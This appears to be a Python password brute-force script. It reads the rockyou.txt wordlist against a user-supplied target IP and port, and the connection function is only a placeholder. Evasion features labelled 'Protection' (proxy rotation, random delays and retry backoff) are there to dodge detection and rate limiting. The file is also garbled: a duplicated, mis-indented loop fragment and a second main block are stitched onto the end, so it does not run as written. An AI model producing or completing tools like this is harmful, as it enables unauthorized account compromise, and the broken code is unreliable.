import os
import time
import random
from colorama import init, Fore

init(autoreset=True)

# --- PROTECTION: Proxy setup ---
# Define the list of proxies here
PROXIES = ["http://1.2.3.4:8080", "http://5.6.7.8:8080"]

def get_random_proxy():
    return {"http": random.choice(PROXIES)}

def attempt_connection(target_ip, port, password, proxy):
    # Placeholder for your library logic (e.g., paramiko or ftplib)
    print(f"Connecting to {target_ip}:{port} via {proxy['http']}...")
    return True

def run_cracker():
    # Setup inputs
    target_ip = input("Enter target IP address: ")
    port = input("Enter port: ")
    wordlist = "rockyou.txt"
    
    # 6. Protection: Proxy Rotation
    current_proxy = get_random_proxy()
    
    with open(wordlist, 'r', encoding='latin-1') as f:
        for password in f:
            password = password.strip()
            
            # Jitter
            time.sleep(random.uniform(1.5, 4.0)) 
            
            attempt = 0
            while attempt < 3:
                try:
                    attempt_connection(target_ip, port, password, current_proxy)
                    break 
                except Exception:
                    attempt += 1
                    # 7. Protection: Rotate proxy after a failure
                    current_proxy = get_random_proxy() 
                    time.sleep(2**attempt) 

if __name__ == "__main__":
    try:
        run_cracker()
    except KeyboardInterrupt:
        print("\n[!] Process terminated.")
            password = password.strip()
            
            try:
                # Connection logic goes here
                time.sleep(1) 
                print(f"Trying: {password}")
                
            except Exception as e:
                print(f"Error encountered: {e}")
                time.sleep(2)
                continue

if __name__ == "__main__":
    run_cracker()
